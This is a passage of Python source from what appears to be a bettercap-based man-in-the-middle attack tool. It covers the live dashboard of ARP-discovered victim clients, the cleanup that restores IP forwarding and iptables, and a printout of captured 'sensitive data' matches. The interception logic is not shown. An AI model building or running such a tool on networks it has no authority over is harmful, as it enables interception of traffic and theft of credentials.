                                border_style=BORDER_STYLE,
                                header_style="bold dim",
                                pad_edge=False,
                                expand=True,
                            )
                            clients_table.add_column("IP", style="cyan", min_width=14, no_wrap=True, overflow="ignore")
                            clients_table.add_column("MAC", style="dim", min_width=17, no_wrap=True, overflow="ignore")
                            clients_table.add_column("Host", style="blue", ratio=1, overflow="fold")

                            if attack_stats["clients"]:
                                sorted_clients = sorted(
                                    attack_stats["clients"].items(),
                                    key=lambda x: x[1]["first_seen"],
                                    reverse=True,
                                )
                                for ip, data in sorted_clients[:18]:
                                    host = data.get("hostname") or "—"
                                    clients_table.add_row(ip, data["mac"], host)
                            else:
                                clients_table.add_row("—", "—", "[dim]No ARP clients yet[/]")

                            layout["clients"].update(
                                Panel(
                                    clients_table,
                                    title="[bold]Clients (ARP)[/]",
                                    border_style=BORDER_STYLE,
                                    box=box.ROUNDED,
                                    padding=(0, 1),
                                )
                            )

                            # 6. Footer — thin legal strip
                            footer = Panel(
                                Align.center(
                                    Text(
                                        "Educational use only  ·  Ctrl+C stops the session  ·  Unauthorized use is illegal",
                                        style="dim white",
                                    )
                                ),
                                style="on red",
                                box=box.MINIMAL,
                                padding=(0, 1),
                            )
                            layout["footer"].update(footer)
                            
                            # Small delay to prevent high CPU usage
                            time.sleep(0.5)
                            
                    except KeyboardInterrupt:
                        # User stopped the attack
                        self.console.print("\n[bold yellow]MITM attack stopped by user.[/]")
                    finally:
                        # Close log files
                        if 'bettercap_stdout_file' in locals() and not bettercap_stdout_file.closed:
                            bettercap_stdout_file.close()
                        if 'bettercap_stderr_file' in locals() and not bettercap_stderr_file.closed:
                            bettercap_stderr_file.close()
                        
                        # Restore system settings
                        self._restore_settings(original_ip_forward, original_iptables, bettercap_process)
                        
                        # Show summary
                        self.console.print(f"\n[bold green]Attack completed. All logs saved to {log_dir}[/]")
                        
                        # Display sensitive data summary
                        if attack_stats['sensitive_matches']:
                            self.console.print("\n[bold red]Sensitive Data Summary:[/]")
                            for data in attack_stats['sensitive_matches'][-5:]:  # Show last 5 entries
                                self.console.print(f"[red]{data}[/]")
                        
                        # Display traffic summary
                        self.console.print(f"\n[bold green]Traffic Summary:[/]")
                        self.console.print(f"Total Packets: {attack_stats['packets']:,}")
                        self.console.print(f"Total Data: {self._format_bytes(attack_stats['bytes'])}")
                        self.console.print(f"Unique Clients: {len(attack_stats['clients']):,}")
                        
            except Exception as e:
                # Handle unexpected errors
                self.console.print(f"\n[bold red]Error during MITM attack: {str(e)}[/]")
                import traceback
                traceback.print_exc()
                
                # Always try to restore settings
                if 'original_ip_forward' in locals() and 'original_iptables' in locals():
                    self._restore_settings(original_ip_forward, original_iptables, 
                                         bettercap_process if 'bettercap_process' in locals() else None)

